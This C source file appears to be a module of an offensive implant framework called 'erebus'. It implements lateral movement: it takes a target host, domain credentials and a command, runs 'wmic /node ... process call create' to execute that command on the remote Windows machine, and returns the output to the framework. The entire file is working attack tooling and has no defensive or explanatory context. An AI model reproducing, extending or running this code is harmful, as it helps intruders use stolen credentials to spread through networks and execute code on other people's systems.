#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/mod_util.h"
#include "erebus/modules.h"
#include "erebus/pb_modules.h"

int erebus_mod_lateral_move(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    erebus_lateral_config cfg;
    if (!erebus_pb_decode_lateral_config(config, config_len, &cfg)) return 0;

    if (!cfg.target[0]) { erebus_pb_free_lateral_config(&cfg); return 0; }

    char cmd[4096];
    int success = 0;
    char output[65536] = {0};

    if (strcmp(cfg.method, "wmi") == 0) {
        const char *command = cfg.command[0] ? cfg.command : "whoami";
        if (cfg.username[0] && cfg.password[0]) {
            snprintf(cmd, sizeof(cmd),
                "wmic /node:\"%s\" /user:\"%s%s%s\" /password:\"%s\" process call create \"%s\"",
                cfg.target,
                cfg.domain[0] ? cfg.domain : "",
                cfg.domain[0] ? "\\" : "",
                cfg.username,
                cfg.password,
                command);
        } else {
            snprintf(cmd, sizeof(cmd),
                "wmic /node:\"%s\" process call create \"%s\"", cfg.target, command);
        }
        char *so = NULL, *se = NULL;
        int32_t code = 1;
        success = erebus_mod_run_cmd(cmd, &so, &se, &code) && code == 0;
        if (so) { strncpy(output, so, sizeof(output) - 1); free(so); }
        if (se) free(se);
    } else {
        erebus_pb_free_lateral_config(&cfg);
        return 0;
    }

    int ok = erebus_pb_encode_lateral_result(cfg.method, cfg.target, success, output, out, out_len);
    erebus_pb_free_lateral_config(&cfg);
    return ok;
}